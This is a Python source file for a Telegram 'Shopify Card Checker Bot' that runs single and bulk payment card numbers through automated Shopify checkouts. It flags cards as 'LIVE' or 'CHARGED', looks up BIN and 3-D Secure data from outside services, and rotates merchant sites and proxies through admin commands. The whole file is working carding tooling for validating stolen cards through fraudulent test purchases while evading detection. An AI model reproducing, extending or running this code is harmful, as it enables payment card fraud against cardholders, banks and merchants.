import os
import time
import html
import io
import asyncio
import aiofiles
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes, CommandHandler, Application, MessageHandler, filters

# Add these imports at the top of main.py
import shopify_auto_checkout as sx

async def get_bin_info(bin_number):
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            response = await client.get(f"https://bins.antipublic.cc/bins/{bin_number}")
            if response.status_code == 200:
                return response.json()
    except:
        pass
    return None

async def get_vbv_info(cc_number):
    """Get VBV (3D Secure) information from API"""
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            response = await client.get(f"https://ronak.xyz/vbv.php?lista={cc_number}")
            if response.status_code == 200:
                text = response.text
                return text.strip() if text else 'N/A'
    except:
        pass
    return 'N/A'

ADMIN_OWNER_ID = 6124719858
ADMIN_OWNER_USERNAME = 'MUMIRU_01'
ADMIN_IDS = [ADMIN_OWNER_ID, 1805944073]

async def is_admin(user_id: int, username: str = None) -> bool:
    """Check if user is admin/owner"""
    if user_id == ADMIN_OWNER_ID:
        return True
    if username and username.lower() == ADMIN_OWNER_USERNAME.lower():
        return True
    if user_id in ADMIN_IDS:
        return True
    return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🛒 Shopify Card Checker Bot\n/sx <card|mm|yy|cvv> - Check a single card")

async def sx_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /sx command for single card check"""
    if not context.args:
        await update.message.reply_text("❌ Invalid format. Use: /sx <card|mm|yy|cvv>\nExample: /sx 4532123456789012|12|25|123")
        return

    card_info = context.args[0]
    if len(card_info.split('|')) != 4:
        await update.message.reply_text("❌ Invalid card format. Use: number|month|year|cvv")
        return

    # Send initial status message
    msg = await update.message.reply_text("⚡ Starting Shopify check...")

    # Process card
    result = await sx.process_single_card(card_info)

    if result['status'] == 'error':
        await msg.edit_text(f"❌ {result['message']}")
        return

    # Format response
    response = await format_shopify_response(result, update.effective_user)
    
    # Save to appropriate file based on status
    status = result.get('status', 'unknown')
    card = result.get('card', 'N/A')
    message = result.get('message', 'N/A')
    
    filename = f"{status}.txt"
    try:
        async with aiofiles.open(filename, mode='a', encoding='utf-8', errors='replace') as f:
            await f.write(f"{card} | {message}\n")
    except Exception as e:
        print(f"Error writing to {filename}: {e}")

    await msg.edit_text(response, parse_mode='HTML')

async def msx_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /msx command for mass card check"""
    user_id = update.effective_user.id

    if update.message.document:
        # Handle file upload
        file = await update.message.document.get_file()
        file_content = await file.download_as_bytearray()
        cards = file_content.decode().split('\n')
        cards = [c.strip() for c in cards if c.strip() and '|' in c]
    elif context.args:
        # Handle inline cards
        cards = context.args[:20]  # Max 20 cards inline
    else:
        await update.message.reply_text("❌ Send cards file or provide cards inline\nFormat: /msx <card1> <card2> ...")
        return

    if not cards:
        await update.message.reply_text("❌ No valid cards found!")
        return

    msg = await update.message.reply_text(f"⚡ Processing {len(cards)} cards...")

    # Create keyboard for live updates
    keyboard = [
        [
            InlineKeyboardButton("✅ Approved", callback_data="none"),
            InlineKeyboardButton("💰 Charged", callback_data="none"),
        ],
        [
            InlineKeyboardButton("❌ Declined", callback_data="none"),
            InlineKeyboardButton("⚠️ Unknown", callback_data="none"),
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await msg.edit_text(f"⚡ Processing {len(cards)} cards...", reply_markup=reply_markup)

    results = []
    approved = []
    charged = []

    for i, card in enumerate(cards, 1):
        # Update progress
        progress = f"📊 Progress: {i}/{len(cards)}"
        price_info = f"💲 Price: {sx.GLOBAL_STATE.stats.get('last_price', 'N/A')}"
        proxy_status = f"🔌 Proxy: {sx.GLOBAL_STATE.stats['proxy_status']}"

        status_text = f"""
⚡ Processing Card {i}/{len(cards)}
{progress}
{price_info}
{proxy_status}
━━━━━━━━━━━━━━━━━━━━━━━
💳 Card: {card[:8]}********
"""

        await msg.edit_text(status_text, reply_markup=reply_markup)

        # Process card
        result = await sx.process_single_card(card)

        if result['status'] == 'success':
            result_msg = result['message']

            if "CHARGED" in result_msg or "ORDER PLACED" in result_msg:
                charged.append(card)
                # Send instant notification
                await update.message.reply_text(
                    f"🎉 CHARGED CARD FOUND!\n{card}",
                    parse_mode='HTML'
                )
            elif "LIVE" in result_msg or "APPROVED" in result_msg:
                approved.append(card)
                # Send instant notification
                await update.message.reply_text(
                    f"✅ LIVE CARD FOUND!\n{card}",
                    parse_mode='HTML'
                )

            results.append(f"{i}. {card}: {result_msg[:50]}...")

    # Send final results
    final_stats = sx.format_stats_response()
    final_response = f"""
📊 MASS CHECK COMPLETE
━━━━━━━━━━━━━━━━━━━━━━━
Total Cards: {len(cards)}
✅ Approved: {len(approved)}
💰 Charged: {len(charged)}
❌ Declined: {len([r for r in results if 'DECLINED' in r])}
⚠️ Errors: {len([r for r in results if 'Error' in r])}
━━━━━━━━━━━━━━━━━━━━━━━
{final_stats}
"""

    await msg.edit_text(final_response)

async def mssx_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /mssx command for mass site check (Admin only)"""
    if not await is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only command!")
        return

    if update.message.document:
        # Handle file upload
        file = await update.message.document.get_file()
        file_content = await file.download_as_bytearray()
        sites = file_content.decode().split('\n')
        sites = [s.strip() for s in sites if s.strip()]
    elif context.args:
        # Handle inline sites
        sites = context.args
    else:
        await update.message.reply_text("❌ Send sites file or provide sites inline\nFormat: /mssx <site1> <site2> ...")
        return

    if not sites:
        await update.message.reply_text("❌ No sites found!")
        return

    msg = await update.message.reply_text(f"🔍 Testing {len(sites)} sites...")

    working, non_working = await sx.mass_check_sites(sites)

    # Save to files
    working_text = '\n\n'.join(working)
    non_working_text = '\n\n'.join(non_working)

    # Send files
    await update.message.reply_document(
        document=io.BytesIO(working_text.encode()),
        filename='working_sites.txt',
        caption=f"✅ Working Sites ({len(working)})"
    )

    await update.message.reply_document(
        document=io.BytesIO(non_working_text.encode()),
        filename='non_working_sites.txt',
        caption=f"❌ Non-Working Sites ({len(non_working)})"
    )

    await msg.edit_text(f"✅ Site check complete!\n✅ Working: {len(working)}\n❌ Non-working: {len(non_working)}")

async def addsx_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /addsx command to add sites to rotation (Admin only)"""
    if not await is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only command!")
        return

    if not update.message.document:
        await update.message.reply_text("❌ Send a text file with sites (one per line)")
        return

    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    sites = file_content.decode().split('\n')
    sites = [s.strip() for s in sites if s.strip()]

    if not sites:
        await update.message.reply_text("❌ No valid sites found in file!")
        return

    sx.GLOBAL_STATE.add_sites(sites)

    await update.message.reply_text(
        f"✅ Added {len(sites)} sites to rotation!\n"
        f"📊 Total sites now: {len(sx.GLOBAL_STATE.available_sites)}"
    )

async def addpp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /addpp command to add proxies to rotation (Admin only)"""
    if not await is_admin(update.effective_user.id):
        await update.message.reply_text("❌ Admin only command!")
        return

    if not update.message.document:
        await update.message.reply_text("❌ Send a text file with proxies (one per line)")
        return

    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    proxies = file_content.decode().split('\n')
    proxies = [p.strip() for p in proxies if p.strip()]

    if not proxies:
        await update.message.reply_text("❌ No valid proxies found in file!")
        return

    sx.GLOBAL_STATE.add_proxies(proxies)

    await update.message.reply_text(
        f"✅ Added {len(proxies)} proxies to rotation!\n"
        f"📊 Total proxies now: {len(sx.GLOBAL_STATE.proxies)}"
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pass

async def format_shopify_response(result: dict, user) -> str:
    """Format Shopify response in the required format"""
    # Extract card info
    card_parts = result['card'].split('|')
    if len(card_parts) != 4:
        return f"❌ Invalid card format: {result['card']}"

    card_num, month, year, cvv = card_parts

    # Get BIN info (you'll need to implement this or use existing function)
    bin_info = await get_bin_info(card_num[:6])

    # Determine status
    result_msg = result['message']
    if "✅" in result_msg or "CHARGED" in result_msg or "ORDER PLACED" in result_msg:
        status = "APPROVED ✅"
    elif "LIVE" in result_msg or "APPROVED" in result_msg:
        status = "APPROVED ✅"
    elif "DECLINED" in result_msg:
        status = "DECLINED ❌"
    else:
        status = "UNKNOWN ⚠️"

    # Format price
    price_display = "N/A"
    if result['price']:
        try:
            price_dollars = float(result['price']) / 100
            price_display = f"{price_dollars:.2f}$"
        except:
            price_display = "N/A"

    # Get VBV info
    vbv_info = await get_vbv_info(card_num)

    # Get user info
    username = user.username or user.first_name or "User"

    # Build response
    response = f"""み ¡@TOjiCHKBot ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
𝗦𝗛𝗢𝗣𝗜𝗙𝗬 {price_display}
━━━━━━━━━
𝐂𝐂 ➜ <code>{result['card']}</code>
𝐒𝐓𝐀𝐓𝐔𝐒 ➜ {status}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {html.escape(result_msg[:100])}
𝑽𝑩𝑽 ➜ {html.escape(vbv_info)}
𝐫𝐞𝐚𝐬𝐨𝐧/𝐭𝐲𝐩𝐞 ➜ N/A
━━━━━━━━━
"""

    # Add BIN info if available
    if bin_info:
        brand = bin_info.get('brand', 'N/A')
        card_type = bin_info.get('type', 'N/A')
        country_flag = bin_info.get('country_flag', '')
        country_name = bin_info.get('country_name', 'N/A')
        bank = bin_info.get('bank', 'N/A')

        response += f"""𝐁𝐈𝐍 ➜ {card_num[:6]}
𝐓𝐘𝐏𝐄 ➜ {card_type}
𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {country_flag} {country_name}
𝐁𝐀𝐍𝐊 ➜ {bank}
━━━━━━━━━
"""

    # Add footer
    response += f"""𝗧/𝘁 : {time.time() - sx.GLOBAL_STATE.stats['start_time']:.2f}s | 𝐏𝐫𝐨𝐱𝐲 : {sx.GLOBAL_STATE.stats['proxy_status']}
𝐑𝐄𝐐 : @{username}
𝐃𝐄𝐕 : @MUMIRU
"""

    return response

def main():
    # Try all possible secret names
    token = os.environ.get("TELEGRAM_TOKEN")
    if not token:
        # Debugging: List available environment variables (keys only)
        # We saw TELEGRAM_TOKEN in the logs but maybe it was an empty string or something went wrong
        print(f"❌ Error: Token not found in TELEGRAM_TOKEN environment variable.")
        # Attempting to use the alternate secret name as a backup
        token = os.environ.get("TELEGRAM_BOT_TOKEN")
    
    if token:
        token = token.strip().replace('"', '').replace("'", "")
        print(f"✅ Token found: {token[:5]}...")
        application = Application.builder().token(token).build()
    else:
        return

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("sx", sx_command))
    application.add_handler(CommandHandler("msx", msx_command))
    application.add_handler(CommandHandler("mssx", mssx_command))
    application.add_handler(CommandHandler("addsx", addsx_command))
    application.add_handler(CommandHandler("addpp", addpp_command))
    
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
